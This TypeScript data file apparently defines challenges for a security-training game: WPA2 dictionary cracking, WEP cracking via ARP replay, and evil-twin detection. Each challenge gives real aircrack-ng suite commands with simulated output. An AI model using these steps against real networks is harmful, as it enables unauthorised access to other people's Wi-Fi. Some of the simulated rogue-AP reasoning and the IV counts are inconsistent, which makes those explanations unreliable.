export interface WirelessClient {
  mac: string;
  probes: string[];
  connectedTo: string;
}

export interface WirelessAccessPoint {
  bssid: string;
  ssid: string;
  channel: number;
  signal: number;
  encryption: string;
  cipher: string;
  authentication: string;
  clients?: WirelessClient[];
}

export interface WirelessStep {
  command: string;
  output: string;
  explanation: string;
}

export interface WirelessChallenge {
  id: string;
  title: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  accessPoints: WirelessAccessPoint[];
  targetBssid: string;
  steps: WirelessStep[];
  cpReward: number;
}

export const WIRELESS_CHALLENGES: WirelessChallenge[] = [
  {
    id: 'wifi-wpa2-1',
    title: 'WPA2 Dictionary Attack',
    description: 'Crack a WPA2-PSK protected WiFi network using a dictionary attack.',
    difficulty: 'beginner',
    accessPoints: [
      {
        bssid: '00:1A:2B:3C:4D:5E',
        ssid: 'NovaCorp-WiFi',
        channel: 6,
        signal: -45,
        encryption: 'WPA2',
        cipher: 'CCMP',
        authentication: 'PSK',
        clients: [{ mac: 'AA:BB:CC:DD:EE:FF', probes: ['NovaCorp-WiFi'], connectedTo: '00:1A:2B:3C:4D:5E' }],
      },
      {
        bssid: '00:1A:2B:3C:4D:5F',
        ssid: 'NovaCorp-Guest',
        channel: 11,
        signal: -52,
        encryption: 'WPA2',
        cipher: 'CCMP',
        authentication: 'PSK',
      },
      {
        bssid: '00:1A:2B:3C:4D:60',
        ssid: 'FreeWiFi',
        channel: 1,
        signal: -38,
        encryption: 'WPA2',
        cipher: 'TKIP',
        authentication: 'PSK',
      },
      {
        bssid: '00:1A:2B:3C:4D:61',
        ssid: 'HP-Print-42-LaserJet',
        channel: 36,
        signal: -60,
        encryption: 'WPA2',
        cipher: 'CCMP',
        authentication: 'PSK',
      },
      {
        bssid: '00:1A:2B:3C:4D:62',
        ssid: 'Neighbors5G',
        channel: 149,
        signal: -72,
        encryption: 'WPA2',
        cipher: 'CCMP',
        authentication: 'PSK',
      },
    ],
    targetBssid: '00:1A:2B:3C:4D:5E',
    steps: [
      {
        command: 'airmon-ng start wlan0',
        output: `PHY Interface: phy0\nDriver: ath9k_htc\n\nMonitor mode enabled on wlan0mon`,
        explanation: 'Enable monitor mode on the wireless interface to capture traffic.',
      },
      {
        command: 'airodump-ng wlan0mon',
        output: `BSSID              PWR  Beacons  #Data  CH  MB  ENC  CIPHER  AUTH  ESSID\n00:1A:2B:3C:4D:5E  -45  234      1206   6   54e. WPA2 CCMP   PSK   NovaCorp-WiFi\n00:1A:2B:3C:4D:5F  -52  189      456    11  54e. WPA2 CCMP   PSK   NovaCorp-Guest\n00:1A:2B:3C:4D:60  -38  312      892    1   54e. WPA2 TKIP   PSK   FreeWiFi\n00:1A:2B:3C:4D:61  -60  145      78     36  54e. WPA2 CCMP   PSK   HP-Print-42-LaserJet\n00:1A:2B:3C:4D:62  -72  98       23     149 54e. WPA2 CCMP   PSK   Neighbors5G\n\nSTATION              PWR   Rate   Lost  Packets  BSSID\nAA:BB:CC:DD:EE:FF    -30   54e-1e  0     892      00:1A:2B:3C:4D:5E`,
        explanation: 'Scan for wireless networks. NovaCorp-WiFi is our target with an active client.',
      },
      {
        command: 'airodump-ng -c 6 --bssid 00:1A:2B:3C:4D:5E -w capture wlan0mon',
        output: `BSSID              PWR  Beacons  #Data  CH  ENC  CIPHER  AUTH  ESSID\n00:1A:2B:3C:4D:5E  -45  234      1206   6   54e. WPA2 CCMP   PSK   NovaCorp-WiFi\n\nSTATION              PWR   Rate   Lost  Packets  BSSID\nAA:BB:CC:DD:EE:FF    -30   54e-1e  0     892      00:1A:2B:3C:4D:5E\n\n^C Interrupted\n[INFO] capture file written to capture-01.cap`,
        explanation: 'Capture traffic on the target channel. Wait for a WPA handshake.',
      },
      {
        command: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap',
        output: `Network Name    [NovaCorp-WiFi]\nBSSID           [00:1A:2B:3C:4D:5E]\n\nKEY FOUND! [ N0vaC0rp!2024 ]\n\nMaster Key     : AA BB CC DD EE FF 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF\nTransient Key  : 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00 11 22 33 44 55 66 77\n\n1 handshake`,
        explanation: 'Crack the WPA2 handshake using the rockyou.txt wordlist. Password found: N0vaC0rp!2024',
      },
    ],
    cpReward: 200,
  },
  {
    id: 'wifi-evil-1',
    title: 'Rogue AP Detection',
    description: 'Identify a rogue access point (evil twin) impersonating the legitimate NovaCorp WiFi.',
    difficulty: 'intermediate',
    accessPoints: [
      {
        bssid: '00:1A:2B:3C:4D:5E',
        ssid: 'NovaCorp-WiFi',
        channel: 6,
        signal: -45,
        encryption: 'WPA2',
        cipher: 'CCMP',
        authentication: 'PSK',
        clients: [{ mac: 'AA:BB:CC:DD:EE:FF', probes: ['NovaCorp-WiFi'], connectedTo: '00:1A:2B:3C:4D:5E' }],
      },
      {
        bssid: '00:DE:AD:BE:EF:01',
        ssid: 'NovaCorp-WiFi',
        channel: 6,
        signal: -30,
        encryption: 'WPA2',
        cipher: 'CCMP',
        authentication: 'PSK',
        clients: [{ mac: 'AA:BB:CC:DD:EE:FF', probes: ['NovaCorp-WiFi'], connectedTo: '00:DE:AD:BE:EF:01' }],
      },
      {
        bssid: '00:1A:2B:3C:4D:5F',
        ssid: 'NovaCorp-Guest',
        channel: 11,
        signal: -52,
        encryption: 'WPA2',
        cipher: 'CCMP',
        authentication: 'PSK',
      },
    ],
    targetBssid: '00:DE:AD:BE:EF:01',
    steps: [
      {
        command: 'airodump-ng wlan0mon',
        output: `BSSID              PWR  Beacons  #Data  CH  MB  ENC  CIPHER  AUTH  ESSID\n00:1A:2B:3C:4D:5E  -45  234      1206   6   54e. WPA2 CCMP   PSK   NovaCorp-WiFi\n00:DE:AD:BE:EF:01  -30  456      2341   6   54e. WPA2 CCMP   PSK   NovaCorp-WiFi\n00:1A:2B:3C:4D:5F  -52  189      456    11  54e. WPA2 CCMP   PSK   NovaCorp-Guest\n\nSTATION              PWR   Rate   Lost  Packets  BSSID\nAA:BB:CC:DD:EE:FF    -25   54e-1e  0     2341     00:DE:AD:BE:EF:01`,
        explanation: 'Two APs with same SSID detected. The stronger signal (-30 vs -45) is suspicious.',
      },
      {
        command: 'airodump-ng --bssid 00:1A:2B:3C:4D:5E -c 6 wlan0mon --write legit',
        output: `BSSID              PWR  Beacons  #Data  CH  ENC  CIPHER  AUTH  ESSID\n00:1A:2B:3C:4D:5E  -45  234      1206   6   54e. WPA2 CCMP   PSK   NovaCorp-WiFi\n\n[INFO] Capturing on channel 6\n[INFO] WPA handshake captured after 45 seconds`,
        explanation: 'Capture handshake from the legitimate AP. Note the BSSID matches known MAC.',
      },
      {
        command: 'airodump-ng --bssid 00:DE:AD:BE:EF:01 -c 6 wlan0mon --write rogue',
        output: `BSSID              PWR  Beacons  #Data  CH  ENC  CIPHER  AUTH  ESSID\n00:DE:AD:BE:EF:01  -30  456      2341   6   54e. WPA2 CCMP   PSK   NovaCorp-WiFi\n\n[INFO] Capturing on channel 6\n[INFO] WPA handshake captured after 12 seconds (faster - open network?)`,
        explanation: 'Capture from rogue AP. The handshake was captured much faster, suggesting weak/no encryption.',
      },
      {
        command: 'md5sum legit-01.cap rogue-01.cap',
        output: `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6  legit-01.cap\nf6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1  rogue-01.cap`,
        explanation: 'Different file hashes confirm different captures - the rogue AP is serving different traffic.',
      },
    ],
    cpReward: 300,
  },
  {
    id: 'wifi-wep-1',
    title: 'WEP Cracking',
    description: 'Crack a legacy WEP-encrypted wireless network.',
    difficulty: 'advanced',
    accessPoints: [
      {
        bssid: '00:1A:2B:3C:4D:70',
        ssid: 'LegacyNet-WEP',
        channel: 3,
        signal: -42,
        encryption: 'WEP',
        cipher: 'WEP',
        authentication: 'Open',
        clients: [
          { mac: '11:22:33:44:55:66', probes: ['LegacyNet-WEP'], connectedTo: '00:1A:2B:3C:4D:70' },
        ],
      },
      {
        bssid: '00:1A:2B:3C:4D:5E',
        ssid: 'NovaCorp-WiFi',
        channel: 6,
        signal: -45,
        encryption: 'WPA2',
        cipher: 'CCMP',
        authentication: 'PSK',
      },
    ],
    targetBssid: '00:1A:2B:3C:4D:70',
    steps: [
      {
        command: 'airmon-ng start wlan0',
        output: `Monitor mode enabled on wlan0mon`,
        explanation: 'Enable monitor mode.',
      },
      {
        command: 'airodump-ng -c 3 --bssid 00:1A:2B:3C:4D:70 -w wep_capture wlan0mon',
        output: `BSSID              PWR  Beacons  #Data  CH  MB  ENC  CIPHER  AUTH  ESSID\n00:1A:2B:3C:4D:70  -42  189      523    3   54e. WEP  WEP     Open  LegacyNet-WEP\n\nSTATION              PWR   Rate   Lost  Packets  BSSID\n11:22:33:44:55:66    -35   54e-1e  0     523      00:1A:2B:3C:4D:70`,
        explanation: 'Capture WEP traffic. Need ~20,000 IVs for cracking.',
      },
      {
        command: 'aireplay-ng -3 -b 00:1A:2B:3C:4D:70 -h 11:22:33:44:55:66 wlan0mon',
        output: `ARP replay attack started\nRead 345 packets... (got 1250 IVs)\nRead 467 packets... (got 2340 IVs)\nRead 589 packets... (got 3567 IVs)\n\nCompleted 1250/20000 IVs`,
        explanation: 'Perform ARP replay attack to generate traffic and capture IVs.',
      },
      {
        command: 'aircrack-ng wep_capture-01.cap',
        output: `Network Name    [LegacyNet-WEP]\nBSSID           [00:1A:2B:3C:4D:70]\n\nKEY FOUND! [ 4A:3B:2C:1D:0E ]\n\n16928 IVs`,
        explanation: 'Crack WEP key with captured IVs. WEP is fundamentally insecure.',
      },
    ],
    cpReward: 400,
  },
];
